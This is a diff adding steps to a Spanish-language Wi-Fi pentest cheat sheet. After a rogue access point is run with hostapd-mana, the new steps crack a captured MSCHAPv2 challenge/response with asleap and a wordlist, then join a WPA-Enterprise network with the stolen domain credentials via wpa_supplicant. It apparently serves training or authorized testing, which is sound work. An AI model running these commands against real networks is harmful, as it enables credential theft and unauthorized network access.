@@ -147,9 +147,35 @@ sudo mousepad /etc/hostapd-mana/mana.eap_user
 
     sudo hostapd-mana /etc/hostapd-mana/mana.conf
 
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0e59b626-081c-4855-b61d-ec4b23c29661)
 
+### 16. Crackeando la clave
+    asleap -C 45:c3:ff:4f:8c:99:b1:53 -R 72:77:33:c5:c3:61:49:9e:48:12:3e:5d:b3:6d:db:10:af -W /usr/share/john/password.lst
 
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/e0ea3340-c9b8-4f3f-b077-5b652a9294e4)
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/bf4b010c-c8c8-494e-95de-690adb69c8d1)
 
+### 17. Conectando a la red
+```
+nano wpa_supplicant.conf
+```
+```
+network={
+    ssid="tu_ssid"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="dominio\usuario"
+    password="contraseña"
+    phase1="peaplabel=0"
+    phase2="auth=MSCHAPV2"
+}
+```
+```
+wpa_supplicant -i wlan0 -c wpa_supplicant.conf
+```
+```
+dhclient wlan0
+```
 
 
 
